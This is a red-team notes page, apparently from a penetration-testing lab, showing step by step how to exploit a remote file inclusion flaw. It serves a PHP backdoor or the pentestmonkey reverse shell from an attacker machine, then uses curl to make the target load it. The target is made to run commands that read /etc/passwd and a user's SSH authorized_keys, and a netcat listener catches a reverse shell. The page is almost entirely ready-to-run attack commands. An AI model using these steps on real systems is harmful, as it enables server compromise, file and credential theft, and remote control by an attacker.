---
title: RFI Stored WebShell
parent: Attack Repository
grand_parent: Red Team
nav_order: 9
---
## Using an Existing Web Shell File


1. Preparations on the attacker's side
- Prepare the web shell file

```bash
cp /usr/share/webshells/php/simple-backdoor.php ./
```

Set up the web server
```bash
python3 -m http.server 80
```

2. Executing the RFI
```bash
curl “http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls”
```

```zsh
curl “http://mountaindesserts.com/meteor/index.php?page=http://192.168.45.204/simple-backdoor.php&cmd=cat%20/etc/passwd”
```

```zsh
curl “http://mountaindesserts.com/meteor/index.php?page=http://192.168.45.204/simple-backdoor.php&cmd=whoami” | grep “<pre>”
```

```zsh
curl “http://mountaindesserts.com/meteor/index.php?page=http://192.168.45.204/simple-backdoor.php&cmd=cat%20/home/elaine/.ssh/authorized_keys”
```

# Using Pentestmonkey
1. Preparations on the attacker's side
- Prepare the web shell file
```bash
# Copy the file
cp ~/github/ReverseShell/php-reverse-shell/php-reverse-shell.php ./

# Modify the relevant lines
# $ip variable: Kali machine's IP address
# $port: 4444
$ip = ‘192.168.45.204’;  // CHANGE THIS
$port = 4444;       // CHANGE THIS
```
- Set up the web server
```bash
python3 -m http.server 80
```
- Set up netcat
```bash
nc -nlvp 4444
```

2. Running the RFI
```bash
curl “http://mountaindesserts.com:8001/meteor/index.php?page=http://192.168.45.204/php-reverse-shell.php”
```
